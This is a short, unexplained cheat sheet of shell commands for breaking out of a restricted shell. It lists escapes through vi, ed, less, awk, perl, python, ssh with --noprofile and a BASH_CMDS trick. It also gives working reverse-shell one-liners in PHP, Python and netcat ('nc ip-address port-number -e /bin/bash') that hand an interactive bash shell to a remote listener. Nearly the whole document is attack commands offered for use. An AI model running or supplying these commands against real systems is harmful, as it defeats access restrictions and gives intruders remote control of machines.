
```shell
BASH_CMDS[a]=/bin/sh;a
```

```shell
export PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:$PATH
export SHELL=/bin/bash
```

### LIST ALL AVAL CMD:
```SHELL
compgen -c 
```

```shell
ssh psj@server_name -t "bash --noprofile"
```

```shell
vi
:set shell=/bin/bash
:shell
```

```shell
cd /home
echo $SHELL
ed
!'/bin/bash'
pwd
```

```shell
php -r '$sock=fsockopen("ip-address",port);exec("/bin/bash -i <&3 >&3 2>&3");'
```

```shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip-address",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

python -c 'import os; os.system("/bin/bash");'
python3 -c 'import os; os.system("/bin/bash");'
```

```shell
perl -e 'system("/bin/bash");'
cd /
cd /home
```

```shell
nc  ip-address port-number -e /bin/bash
```

```shell
cd / 
echo $SHELL
less anyfile.txt
```

```shell
awk 'BEGIN {system("/bin/bash")}'
cd /home
cd ~
pwd
```

